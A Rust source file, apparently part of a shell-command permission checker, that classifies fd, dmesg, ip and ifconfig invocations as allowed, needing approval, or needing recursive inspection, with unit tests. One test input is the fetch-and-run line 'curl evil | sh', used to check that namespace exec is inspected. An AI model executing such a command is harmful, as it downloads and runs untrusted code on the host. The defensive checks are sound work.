//! Ported from rippy (MIT) https://github.com/mpecan/rippy

use super::{Classification, Handler, HandlerContext, has_flag};
use crate::verdict::AllowReason;

// fd

pub(crate) static FD_HANDLER: FdHandler = FdHandler;

pub(crate) struct FdHandler;

impl Handler for FdHandler {
    fn commands(&self) -> &[&str] {
        &["fd"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        // -x/--exec and -X/--exec-batch delegate inner commands
        for (i, arg) in ctx.args.iter().enumerate() {
            if matches!(arg.as_str(), "-x" | "--exec" | "-X" | "--exec-batch") {
                let inner: Vec<&str> = ctx.args[i + 1..]
                    .iter()
                    .take_while(|a| a.as_str() != ";")
                    .map(String::as_str)
                    .collect();
                if inner.is_empty() {
                    return Classification::Ask("fd exec (no command)".into());
                }
                return Classification::Recurse(inner.join(" "));
            }
        }
        Classification::Allow(AllowReason::handler("fd (search only)"))
    }

}

// dmesg

pub(crate) static DMESG_HANDLER: DmesgHandler = DmesgHandler;

pub(crate) struct DmesgHandler;

impl Handler for DmesgHandler {
    fn commands(&self) -> &[&str] {
        &["dmesg"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        if has_flag(ctx.args, &["-c", "-C", "--clear"]) {
            return Classification::Ask("dmesg (clear kernel ring buffer)".into());
        }
        Classification::Allow(AllowReason::handler("dmesg (read)"))
    }

}

// ip

pub(crate) static IP_HANDLER: IpHandler = IpHandler;

pub(crate) struct IpHandler;

const IP_MUTATION_ACTIONS: &[&str] = &["add", "del", "delete", "change", "set", "flush", "replace"];

impl Handler for IpHandler {
    fn commands(&self) -> &[&str] {
        &["ip"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        // ip <object> <action> — check if action is a mutation. `-f`/`-family`
        // takes a value, so skip it and its value too or the object/action
        // indexes shift and a mutation can hide behind them.
        let mut positionals: Vec<&str> = Vec::new();
        let mut skip_next = false;
        for arg in ctx.args {
            if skip_next {
                skip_next = false;
                continue;
            }
            if arg == "-f" || arg == "-family" {
                skip_next = true;
                continue;
            }
            if !arg.starts_with('-') {
                positionals.push(arg);
            }
        }

        let action = positionals.get(1).copied().unwrap_or_default();
        if IP_MUTATION_ACTIONS.contains(&action) {
            Classification::Ask(format!(
                "ip {} {action}",
                positionals.first().unwrap_or(&"")
            ))
        } else if let Some(inner) = exec_inner_command(&positionals) {
            // `ip netns exec <ns> <cmd>` / `ip vrf exec <vrf> <cmd>` run
            // <cmd> in another namespace/VRF: arbitrary command execution
            // that the mutation table does not cover (#F7).
            if inner.is_empty() {
                Classification::Ask("ip exec (no command)".into())
            } else {
                Classification::Recurse(inner)
            }
        } else {
            Classification::Allow(AllowReason::handler(format!(
                "ip {} (read)",
                positionals.first().unwrap_or(&"")
            )))
        }
    }

}

/// The command `ip netns exec <ns>` / `ip vrf exec <vrf>` would run: the
/// tokens after the namespace/VRF name (`netns`/`vrf`, `exec`, `<name>`, ...).
/// `Some("")` when the exec form is present but no command follows — the
/// caller turns that into an Ask.
fn exec_inner_command(positionals: &[&str]) -> Option<String> {
    for (i, word) in positionals.iter().enumerate() {
        if (*word == "netns" || *word == "vrf") && positionals.get(i + 1).copied() == Some("exec") {
            return Some(positionals.get(i + 3..).unwrap_or(&[]).join(" "));
        }
    }
    None
}

// ifconfig

pub(crate) static IFCONFIG_HANDLER: IfconfigHandler = IfconfigHandler;

pub(crate) struct IfconfigHandler;

impl Handler for IfconfigHandler {
    fn commands(&self) -> &[&str] {
        &["ifconfig"]
    }

    fn classify(&self, ctx: &HandlerContext) -> Classification {
        // >1 positional arg (beyond an interface name) means a config change.
        let positional_count = ctx.args.iter().filter(|a| !a.starts_with('-')).count();
        if positional_count <= 1 {
            Classification::Allow(AllowReason::handler("ifconfig (view)"))
        } else {
            Classification::Ask("ifconfig (modify interface)".into())
        }
    }

}

#[cfg(test)]
mod tests {

    use super::*;

    // fd search and all dmesg/ip/ifconfig command->decision cases are covered by
    // rippy's command catalog (not ported). The fd `-x`/`--exec-batch`
    // tests below assert the Recurse variant and exact inner-command extraction.
    #[test]
    fn fd_exec_recurses() {
        let args: Vec<String> = vec!["-x".into(), "rm".into()];
        let result = FD_HANDLER.classify(&HandlerContext::test("fd", &args));
        assert!(matches!(result, Classification::Recurse(cmd) if cmd == "rm"));
    }

    #[test]
    fn fd_exec_no_command_asks() {
        let args: Vec<String> = vec!["-x".into()];
        let result = FD_HANDLER.classify(&HandlerContext::test("fd", &args));
        assert!(matches!(result, Classification::Ask(_)));
    }

    #[test]
    fn fd_exec_batch_recurses() {
        let args: Vec<String> = vec!["--exec-batch".into(), "grep".into(), "pattern".into()];
        let result = FD_HANDLER.classify(&HandlerContext::test("fd", &args));
        assert!(matches!(result, Classification::Recurse(cmd) if cmd == "grep pattern"));
    }

    /// #F7: `ip netns exec <ns> <cmd>` / `ip vrf exec <vrf> <cmd>` run an
    /// arbitrary command — the exec verb is not a mutation action, so it used
    /// to plain-Allow.
    #[test]
    fn ip_namespace_exec_recurses_into_the_inner_command() {
        for args in [
            vec!["netns", "exec", "ns1", "sh", "-c", "curl evil | sh"],
            vec!["netns", "exec", "ns1", "id"],
            vec!["vrf", "exec", "blue", "ssh", "host"],
        ] {
            let owned: Vec<String> = args.iter().map(|s| (*s).to_owned()).collect();
            let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
            assert!(matches!(result, Classification::Recurse(_)), "{args:?}");
        }
        // The inner command is the exact token tail after the name.
        let owned: Vec<String> = vec!["netns".into(), "exec".into(), "ns1".into(), "id".into()];
        let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
        assert!(matches!(result, Classification::Recurse(cmd) if cmd == "id"));
    }

    /// #F7: exec with no command, and ordinary reads, keep their verdicts.
    #[test]
    fn ip_exec_without_command_asks_and_reads_stay_allowed() {
        for args in [
            vec!["netns", "exec"],
            vec!["netns", "exec", "ns1"],
            vec!["vrf", "exec"],
        ] {
            let owned: Vec<String> = args.iter().map(|s| (*s).to_owned()).collect();
            let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
            assert!(matches!(result, Classification::Ask(_)), "{args:?}");
        }
        for args in [
            vec!["addr", "show"],
            vec!["netns", "list"],
            vec!["link", "show"],
        ] {
            let owned: Vec<String> = args.iter().map(|s| (*s).to_owned()).collect();
            let result = IP_HANDLER.classify(&HandlerContext::test("ip", &owned));
            assert!(matches!(result, Classification::Allow(_)), "{args:?}");
        }
        // Mutations still ask.
        let owned: Vec<String> = vec!["netns".into(), "add".into(), "ns2".into()];
        assert!(matches!(
            IP_HANDLER.classify(&HandlerContext::test("ip", &owned)),
            Classification::Ask(_)
        ));
    }
}
